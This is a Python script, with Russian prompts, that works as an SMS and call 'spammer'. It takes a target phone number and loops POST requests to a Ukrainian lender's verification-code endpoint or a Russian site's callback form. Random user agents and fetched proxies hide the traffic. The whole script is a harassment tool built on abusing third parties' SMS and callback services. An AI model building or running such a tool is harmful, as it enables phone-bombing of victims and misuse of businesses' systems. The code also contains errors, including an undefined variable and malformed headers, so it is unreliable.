#Version 1.0
import requests
import fake_useragent
import os
from threading import Thread
from rich.console import Console
from rich.progress import *

console = Console()

os.system('cls' if os.name == 'nt' else 'clear')

def generate_proxy():
    proxy = requests.get("https://gimmeproxy.com/api/getProxy?curl=true&protocol=http&supportsHttps=true").text
    console.print(proxy)
    return {"http": proxy, "https": proxy}
    main()

console.print('''[bold green]
                 _   _ 
   ___    __ _  | | | |
  / __|  / _` | | | | |
 | (__  | (_| | | | | |
  \___|  \__,_| |_| |_|
''')


conut = console.input('[red]Введите вашу страну:\n[red][1] - Украина\n[2] - Россия\n\n[blue]spammer>> ')

name = console.input('[purple]Введите ваше имя:\n [blue]spammer>> ')

console.print('[yellow]Введите ваш номер телефона: ')

phone = console.input('[blue]spammer>> ')

proxy = console.input("[yellow]Использовать прокси? (y/n):\n[blue]spammer>> ")
if proxy.lower() == "y":
        proxies = generate_proxy()
else:
        proxies = None

run = int(console.input('[green]Введите количество запросов (1-10):\n[blue]spammer>> '))

def ukr():
        for _ in track(range(run)):
                user = fake_useragent.UserAgent().random
                headers = {'user_agent : user'}
                try:
                	    requests.post("https://api.creditkasa.ua/public/auth/sendAcceptanceCode", json={"firstName": name, "lastName": "Соколов", "mobilePhone": phone}, proxies=proxies)
                	    pass
                except:
                	    pass

def russ():
        for _ in track(range(run)):
                try:
                        requests.post("https://brilliant24.ru/index/callme", data={"phone": "+" + number}, proxies=proxies)
                        pass
                except:
                	    pass


if conut =='1':
        ukr()
elif conut == '2':
        russ()
